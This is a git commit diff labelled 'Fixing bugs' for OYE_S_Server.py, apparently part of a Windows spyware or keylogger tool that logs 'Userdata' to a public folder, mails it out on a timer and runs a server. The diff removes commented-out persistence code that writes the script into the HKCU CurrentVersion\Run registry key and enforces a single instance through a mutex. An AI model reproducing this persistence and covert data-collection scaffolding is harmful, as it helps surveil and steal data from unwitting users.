c71815826882783d599c9656e317201b9ce7362d
admin87OYE <kitic.noob@gmail.com>
2017-06-05 23:35:32 +0200

    Fixing bugs

--- OYE_S_Server.py
+++ OYE_S_Server.py
@@ -1,13 +1,6 @@
 from oyesserver import Server
 from oyeslogger import Logger
 from oyesmailer import Mailer
-'''
-import win32event
-import win32api
-import winerror
-import os.path
-from winreg import *
-'''
 
 
 class OyeSServer:
@@ -18,32 +11,15 @@ class OyeSServer:
     server = None
 
     def main(self):
-        # self.handle_mul_instances()
-        # self.add_startup()
         self.logger = Logger("C:\\Users\\Public\\", "Userdata")
         self.mailer = Mailer(self, freq=20)
         self.server = Server(self)
 
-    '''
-    # TODO: Fix this functionality
-    @staticmethod
-    def handle_mul_instances():
-        mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
-        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-            mutex = None
-            exit(0)
-
-    # TODO: Fix this functionality
-    @staticmethod
-    def add_startup():
-        f = os.path.dirname(os.path.realpath(__file__))
-        new_file_path = f + "\\" + "OYE_S_SERVER.py"
-        key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
-        key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
-        SetValueEx(key2change, "OYE_S_SERVER", 0, REG_SZ, new_file_path)
-    '''
-
 
 if __name__ == '__main__':
-    server = OyeSServer()
-    server.main()
+    try:
+        server = OyeSServer()
+        server.main()
+    except:
+        server = OyeSServer()
+        server.main()
